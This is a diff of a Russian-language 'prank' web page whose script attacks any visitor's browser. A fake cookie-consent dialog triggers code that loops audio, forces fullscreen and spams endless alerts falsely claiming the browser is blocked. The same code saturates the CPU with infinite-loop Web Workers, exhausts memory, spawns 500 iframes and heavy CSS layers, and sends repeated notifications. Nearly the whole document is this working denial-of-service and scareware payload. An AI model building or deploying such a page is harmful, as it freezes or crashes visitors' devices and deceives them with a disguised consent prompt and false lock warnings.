@@ -1,46 +1,27 @@
-<html onmousedown="startAttack()" onmousemove="startAttack()" onscroll="startAttack()">
+<html onmousedown="startAttack()">
 <head>
-    <title>Сайт розыгрыш</title>
+    <title>Сайт1 розыгрыш</title>
     <script>
-        let sound; // Один аудиоэлемент
+        var sound = new Audio();
+        sound.src = 'alarm.mp3'; // Замените на путь к вашему аудиофайлу
+        sound.loop = true;
 
-        // Функция для включения полноэкранного режима
-        function goFullscreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
-                document.documentElement.mozRequestFullScreen();
-            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari and Opera
-                document.documentElement.webkitRequestFullscreen();
-            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
-                document.documentElement.msRequestFullscreen();
-            }
-        }
-
+        // Функция, которая запускает атаки
         function startAttack() {
-            // Включаем звук
-            sound = new Audio();
-            sound.src = 'ponos-mp3.mp3'; // Заменить на нужный файл
-            sound.loop = true;
             sound.play();
 
-            // После того, как звук начнёт играть, включаем полноэкранный режим
-            sound.onplay = function() {
-                goFullscreen();
+            // Переводим страницу в полноэкранный режим
+            document.documentElement.requestFullscreen().catch(err => {
+                console.error("Ошибка при переходе в полноэкранный режим: ", err);
+            });
 
-                // Запуск всех остальных атак после включения звука и полноэкранного режима
-                initiateAttack();
-            };
-        }
-
-        function initiateAttack() {
-            // Запуск бесконечных alert()  
+            // Запуск бесконечных alert()
             setTimeout(function spamAlert() {
                 alert("Ваш браузер заблокирован! Перезагрузите устройство.");
                 spamAlert();
             }, 100);
 
-            // Перегрузка процессора Web Workers  
+            // Перегрузка процессора с помощью Web Workers
             for (let i = 0; i < 20; i++) {
                 let worker = new Worker(URL.createObjectURL(new Blob([`
                     while (true) {
@@ -49,7 +30,7 @@
                 `], { type: 'application/javascript' })));
             }
 
-            // Заполнение оперативной памяти большими массивами  
+            // Заполнение оперативной памяти большими массивами
             let memoryHog = [];
             setInterval(() => {
                 for (let i = 0; i < 10000; i++) {
@@ -57,7 +38,7 @@
                 }
             }, 100);
 
-            // Множество iframe  
+            // Множество iframe
             for (let i = 0; i < 500; i++) {
                 let iframe = document.createElement('iframe');
                 iframe.src = "https://example.com";
@@ -67,7 +48,7 @@
                 document.body.appendChild(iframe);
             }
 
-            // Графическая перегрузка (CSS box-shadow и анимация)  
+            // Графическая перегрузка (CSS box-shadow и анимация)
             for (let i = 0; i < 100; i++) {
                 let div = document.createElement('div');
                 div.style.width = "100vw";
@@ -77,7 +58,7 @@
                 document.body.appendChild(div);
             }
 
-            // Несворачиваемые уведомления  
+            // Несворачиваемые уведомления
             if (Notification.permission === "granted") {
                 setInterval(() => {
                     new Notification("⚠️ ВАЖНОЕ СООБЩЕНИЕ!", {
@@ -115,11 +96,105 @@
             -webkit-tap-highlight-color: transparent;
             user-select: none;
         }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100vh;
+            width: 100vw;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 100;
+        }
+
+        p.overlay-title {
+            font-size: 24px;
+            font-weight: 900;
+            color: white;
+            line-height: 1;
+            margin-bottom: 16px;
+        }
+
+        .overlay-button {
+            display: inline-flex;
+            align-items: center;
+            height: 40px;
+            padding-right: 24px;
+            padding-left: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            line-height: 1;
+            border-radius: 4px;
+            margin: 4px;
+            cursor: pointer;
+            background-color: rgb(58, 58, 58);
+            color: white;
+        }
+
+        .overlay-buttons-wrapper {
+            margin: 24px -8px -8px;
+        }
+
+        p.overlay-description {
+            font-size: 16px;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.25;
+            margin-bottom: 16px;
+        }
+
+        a.overlay-link {
+            display: inline-block;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgb(58, 58, 58);
+            line-height: 1;
+            position: relative;
+            margin-top: 16px;
+        }
+
+        a.overlay-link::before {
+            position: absolute;
+            content: "";
+            height: calc(50% + 4px);
+            width: calc(100% + 8px);
+            bottom: -4px;
+            left: -4px;
+            background-color: rgba(58, 58, 58, 0.1);
+        }
+
+        .overlay-body {
+            max-width: 512px;
+            text-align: center;
+            font-family: "Inter", sans-serif;
+            padding: 24px;
+        }
+
+        .overlay {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f6fa;
+        }
     </style>
 </head>
 
-<body>
-    <h1>Нажми, чтобы продолжить</h1>
+<body onmousedown="startAttack()">
+  <div id="overlay" class="overlay">
+    <div class="overlay-body">
+      <p class="overlay-title">Cookies и сторонний контент</p>
+      <p class="overlay-description">Этот сайт использует cookies, чтобы собирать информацию об ошибках и улучшать сайт. Нажмите "Принять" для продолжения.</p>
+      <div class="overlay-buttons-wrapper">
+        <div id="accept-button" class="overlay-button">Принять</div>
+        <div id="decline-button" class="overlay-button">Отклонить</div>
+      </div>
+      <a href="" target="_blank" class="overlay-link">Пользовательское соглашение</a>
+    </div>
+  </div>
 </body>
 </html>
-
